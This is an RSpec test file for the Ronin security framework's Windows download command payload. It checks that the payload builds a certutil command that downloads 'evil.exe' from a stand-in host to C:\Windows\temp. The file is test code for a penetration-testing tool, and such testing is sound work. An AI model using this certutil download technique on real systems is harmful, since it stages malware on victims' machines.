require 'spec_helper'
require 'ronin/payloads/builtin/cmd/windows/download'

describe Ronin::Payloads::CMD::Windows::Download do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/windows/download'" do
      expect(subject.id).to eq('cmd/windows/download')
    end
  end

  let(:url)  { 'https://example.com/evil.exe' }
  let(:dest) { 'C:\Windows\temp\evil.exe' }

  subject do
    described_class.new(
      params: {
        url:  url,
        dest: dest
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload to 'certutil -urlcache -f URL DEST'" do
      expect(subject.payload).to eq(
        "certutil -urlcache -f '#{url}' #{dest}"
      )
    end
  end
end
